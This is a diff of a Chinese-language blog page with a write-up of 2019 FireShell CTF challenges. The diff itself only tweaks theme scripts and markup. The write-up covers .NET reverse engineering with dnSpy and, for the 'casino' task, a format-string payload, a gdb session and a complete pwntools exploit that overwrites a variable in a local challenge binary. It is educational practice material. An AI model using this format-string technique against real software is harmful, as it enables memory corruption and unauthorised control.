@@ -64,9 +64,31 @@
 
 
   
+  
+  <div class="site-header-image">
+    <img id="originBg" width="100%" alt="Hike News" src>
+  </div>
+
+  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
+    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
+  </div>
+
+  <script>
+        var imgUrls = "css/images/pose01.jpg".split(",");
+        var random = Math.floor((Math.random() * imgUrls.length ));
+        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
+          document.getElementById("originBg").src=imgUrls[random];
+          document.getElementById("blurBg").src=imgUrls[random];
+        } else {
+          document.getElementById("originBg").src='/' + imgUrls[random];
+          document.getElementById("blurBg").src='/' + imgUrls[random];
+        }
+    </script>
 
 
-<header id="allheader" class="site-header" role="banner">
+
+
+<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
   <div class="clearfix container">
       <div class="site-branding">
 
@@ -138,7 +160,7 @@
         <p>比赛没打，当作练习以及看着大佬的writeup复现了一下几道二进制。</p>
 <a id="more"></a>
 <h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Blackbox-0"><a href="#Blackbox-0" class="headerlink" title="Blackbox-0"></a>Blackbox-0</h2><p>先file一下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> file Blackbox-0.exe </span><br><span class="line">Blackbox-0.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file Blackbox-0.exe </span></span><br><span class="line">Blackbox-0.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows</span><br></pre></td></tr></table></figure>
 <p>运行程序：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This binary is a black box.</span><br><span class="line">This means that it was designed to be analyzed without looking it&apos;s inside contents</span><br><span class="line">You will solve the chalenge by letting the flag to be outputted in some way.</span><br><span class="line">You will need to figure out what this binary is doing by just examining it&apos;s behaviour in the environment.</span><br></pre></td></tr></table></figure>
 <p>是<code>.NET</code>程序，故使用<a href="https://github.com/0xd4d/dnSpy" target="_blank" rel="noopener">dnSpy</a>来调试。在单步时，发现<code>\u000F\u2009</code>第354行返回一个变量<code>text</code>。</p>
@@ -146,7 +168,7 @@
 <p>在这里设下断点，并多次继续后会得到一串base64，解密得到flag：</p>
 <p><img src="/pics/2019-FireShell-review/RE/Blackbox-0/2.png" alt="text值为base64串"></p>
 <h2 id="Blackbox-1"><a href="#Blackbox-1" class="headerlink" title="Blackbox-1"></a>Blackbox-1</h2><p>file一下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> file Blackbox-1.exe </span><br><span class="line">Blackbox-1.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file Blackbox-1.exe </span></span><br><span class="line">Blackbox-1.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows</span><br></pre></td></tr></table></figure>
 <p>运行程序没有任何输出。同样因为是<code>.NET</code>程序，使用dnSpy调试。在<code>\u000F\u2009</code>第358行返回一个变量<code>text</code>：</p>
 <p><img src="/pics/2019-FireShell-review/RE/Blackbox-1/1.png" alt="可疑代码段"></p>
 <p>在此处设置断点并多次继续，<code>text</code>的值会变成flag：</p>
@@ -175,7 +197,7 @@
 <p>说明猜数字过了，而bet累加起来只有99，没有超过100。此时回忆之前的代码，<code>printf(&quot;Welcome &quot;, &amp;buf);</code>存在格式化字符串漏洞，我们只需要通过这个漏洞，将<code>bet</code>的值改写即可。通过gdb调试得到<code>bet</code>的地址：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400ac3 &lt;main+132&gt;:	call   0x400840 &lt;printf@plt&gt;</span><br><span class="line">   0x400ac8 &lt;main+137&gt;:	mov    edi,0xa</span><br><span class="line">   0x400acd &lt;main+142&gt;:	call   0x4007f0 &lt;putchar@plt&gt;</span><br><span class="line">=&gt; 0x400ad2 &lt;main+147&gt;:	mov    eax,DWORD PTR [rip+0x201548]        # 0x602020 &lt;bet&gt;</span><br><span class="line">   0x400ad8 &lt;main+153&gt;:	add    DWORD PTR [rbp-0x50],eax</span><br><span class="line">   0x400adb &lt;main+156&gt;:	mov    eax,DWORD PTR [rbp-0x50]</span><br><span class="line">   0x400ade &lt;main+159&gt;:	mov    edi,eax</span><br><span class="line">   0x400ae0 &lt;main+161&gt;:	call   0x400870 &lt;srand@plt&gt;</span><br></pre></td></tr></table></figure>
 <p>确定第一个参数在栈上的偏移为11：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[casino] python -c 'print "%2c%11$n" + "\x20\x20\x60\x00\x00\x00\x00\x00"' &gt; input             20:06:05 </span><br><span class="line">[casino] gdb ./casino -q                                                                       20:06:11 </span><br><span class="line">Reading symbols from ./casino...(no debugging symbols found)...done.</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; b *main+137</span><br><span class="line">Breakpoint 1 at 0x400ac8</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; r &lt; input </span><br><span class="line">Starting program: /root/ctf/2019-FireShell/casino/casino &lt; input</span><br><span class="line">What is your name? Welcome  ?  `</span><br><span class="line">Breakpoint 1, 0x0000000000400ac8 in main ()</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; x/wx 0x602020</span><br><span class="line">0x602020 &lt;bet&gt;:	0x00000002</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[casino] python -c 'print "%2c%11$n" + "\x20\x20\x60\x00\x00\x00\x00\x00"' &gt; input             20:06:05 </span><br><span class="line">[casino] gdb ./casino -q                                                                       20:06:11 </span><br><span class="line">Reading symbols from ./casino...(no debugging symbols found)...done.</span><br><span class="line"><span class="meta">assassinq&gt;</span><span class="bash">&gt; b *main+137</span></span><br><span class="line">Breakpoint 1 at 0x400ac8</span><br><span class="line"><span class="meta">assassinq&gt;</span><span class="bash">&gt; r &lt; input </span></span><br><span class="line">Starting program: /root/ctf/2019-FireShell/casino/casino &lt; input</span><br><span class="line">What is your name? Welcome  ?  `</span><br><span class="line">Breakpoint 1, 0x0000000000400ac8 in main ()</span><br><span class="line"><span class="meta">assassinq&gt;</span><span class="bash">&gt; x/wx 0x602020</span></span><br><span class="line">0x602020 &lt;bet&gt;:	0x00000002</span><br></pre></td></tr></table></figure>
 <p>我把bet的值改为2。最后的exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./casino'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">bet_addr = <span class="number">0x0000000000602020</span></span><br><span class="line">bet = <span class="number">2</span></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">fmt = <span class="string">'%&#123;&#125;c%&#123;&#125;$n'</span></span><br><span class="line">payload = flat([fmt.format(str(bet), str(offset)), bet_addr])</span><br><span class="line">p.sendlineafter(<span class="string">'name?'</span>, payload)</span><br><span class="line">s = process(<span class="string">'./solve'</span>)</span><br><span class="line">nums = s.recvall().split(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">	p.sendlineafter(<span class="string">'number:'</span>, n)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
 <h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://cute-0tter.hatenablog.com/entry/2019/01/28/153836" target="_blank" rel="noopener">https://cute-0tter.hatenablog.com/entry/2019/01/28/153836</a><br><a href="https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NA</a><br><a href="https://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aug" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aug</a><br><a href="https://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.md" target="_blank" rel="noopener">https://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.md</a><br><a href="https://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.md" target="_blank" rel="noopener">https://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.md</a></p>
@@ -231,9 +253,9 @@
     </a>
   
   
-    <a href="/2019/01/28/2019-Codegate-review/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2019/01/28/2019-Codegate-Preliminary-review/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">2019-Codegate-review</div>
+      <div class="article-nav-title">2019-Codegate-Preliminary-review</div>
     </a>
   
 </nav>
@@ -293,6 +315,9 @@
 
 
     <!-- headerblur min height -->
+    
+      var headerblur = document.getElementById("header-blur");
+      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
     
     
 </script>
